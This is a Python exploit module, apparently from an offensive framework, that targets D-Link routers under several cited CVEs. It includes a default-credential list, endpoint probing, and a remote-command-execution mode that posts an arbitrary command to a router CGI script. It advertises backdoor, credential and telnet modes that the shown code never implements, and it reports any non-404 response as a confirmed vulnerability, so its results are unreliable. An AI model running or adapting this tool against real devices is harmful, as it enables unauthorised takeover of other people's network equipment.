#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
D-Link Router Exploit Module
Multiple CVEs including CVE-2021-45382, CVE-2020-27867
"""

import requests
import socket
import time
import base64
from pathlib import Path

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.syntax import Syntax
    console = Console()
except ImportError:
    class SimpleConsole:
        def print(self, msg): 
            print(msg)
    console = SimpleConsole()

import urllib3
urllib3.disable_warnings()

MODULE_INFO = {
    "name": "D-Link Multi-Exploit",
    "description": "Multiple CVEs for D-Link routers and devices",
    "author": "Lazy Framework Team",
    "license": "MIT",
    "platform": "linux",
    "arch": "mips,arm",
    "rank": "High",
    "references": [
        "CVE-2021-45382",
        "CVE-2020-27867",
        "CVE-2019-17506"
    ],
    "dependencies": ["requests"]
}

OPTIONS = {
    "RHOST": {"description": "Target IP", "required": True, "default": "192.168.0.1"},
    "RPORT": {"description": "Web port", "required": False, "default": "80"},
    "PROTO": {"description": "HTTP protocol", "required": False, "default": "http", "choices": ["http", "https"]},
    "USERNAME": {"description": "Username", "required": False, "default": "admin"},
    "PASSWORD": {"description": "Password", "required": False, "default": ""},
    "MODE": {
        "description": "Exploit mode",
        "required": False,
        "default": "detect",
        "choices": ["detect", "rce", "backdoor", "credentials", "telnet"]
    },
    "CMD": {"description": "Command", "required": False, "default": "id"},
}

# D-Link Default Credentials (often blank password)
DLINK_CREDS = [
    ("admin", ""),
    ("admin", "admin"),
    ("user", "user"),
    ("", ""),
]

class DLinkExploit:
    def __init__(self, target, port=80, proto="http", username="admin", password=""):
        self.target = target
        self.port = port
        self.proto = proto
        self.username = username
        self.password = password
        self.base_url = f"{proto}://{target}:{port}"
        self.session = requests.Session()
        if proto == "https":
            self.session.verify = False
        
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0',
            'Referer': f'{self.base_url}/'
        })
    
    def detect_device(self):
        """Detect D-Link router"""
        console.print("\n[bold yellow]=== D-Link DETECTION ===[/bold yellow]")
        
        try:
            r = self.session.get(f"{self.base_url}/", timeout=10)
            html_content = r.text.lower()
            
            dlink_detected = False
            if "d-link" in html_content or "dlink" in html_content:
                dlink_detected = True
                console.print("[green]✓ D-Link router detected[/green]")
            
            # Test vulnerabilities
            vulns = self.test_vulnerabilities()
            
            return {
                'is_dlink': dlink_detected,
                'vulnerabilities': vulns
            }
                
        except Exception as e:
            console.print(f"[red]✗ Detection failed: {str(e)}[/red]")
            return {'is_dlink': False}
    
    def test_vulnerabilities(self):
        """Test D-Link vulnerabilities"""
        console.print("[bold yellow][*] Testing D-Link vulnerabilities...[/bold yellow]")
        
        vulns = []
        
        # Test CVE-2021-45382 - RCE
        endpoints = [
            "/cgi-bin/execute_cmd.cgi",
            "/cgi-bin/command.cgi",
            "/apply.cgi",
            "/tools_system.xgi"
        ]
        
        for endpoint in endpoints:
            try:
                url = f"{self.base_url}{endpoint}"
                r = self.session.get(url, timeout=5)
                if r.status_code != 404:
                    vulns.append(endpoint)
                    console.print(f"[green]✓ Vulnerability found: {endpoint}[/green]")
            except:
                continue
        
        return vulns
    
    def exploit_rce(self, command):
        """Exploit D-Link RCE vulnerability"""
        console.print("[bold yellow][*] Exploiting D-Link RCE...[/bold yellow]")
        
        try:
            # CVE-2021-45382 exploitation
            payload = {
                'cmd': command,
                'execute': 'Execute'
            }
            
            exploit_url = f"{self.base_url}/cgi-bin/execute_cmd.cgi"
            r = self.session.post(exploit_url, data=payload, timeout=10)
            
            if r.status_code == 200:
                console.print("[green]✓ Command execution attempted[/green]")
                return True
        except Exception as e:
            console.print(f"[red]✗ RCE exploit failed: {str(e)}[/red]")
        
        return False

def run(session, options):
    """Main D-Link exploit function"""
    console.print(Panel("D-Link Router Exploit", style="bold cyan"))
    
    rhost = options.get("RHOST", "192.168.0.1")
    rport = options.get("RPORT", "80")
    proto = options.get("PROTO", "http")
    username = options.get("USERNAME", "admin")
    password = options.get("PASSWORD", "")
    mode = options.get("MODE", "detect")
    cmd = options.get("CMD", "id")
    
    console.print(f"[bold yellow][*] Target: {proto}://{rhost}:{rport}[/bold yellow]")
    
    try:
        exploit = DLinkExploit(rhost, rport, proto, username, password)
        
        if mode == "detect":
            result = exploit.detect_device()
            if result['is_dlink']:
                console.print("[green]✓ D-Link router detected[/green]")
                console.print(f"[cyan]Vulnerabilities: {len(result['vulnerabilities'])}[/cyan]")
            else:
                console.print("[red]✗ Not a D-Link router[/red]")
        
        elif mode == "rce":
            exploit.exploit_rce(cmd)
        
        return True
        
    except Exception as e:
        console.print(f"[bold red]✗ Error: {str(e)}[/red]")
        return False
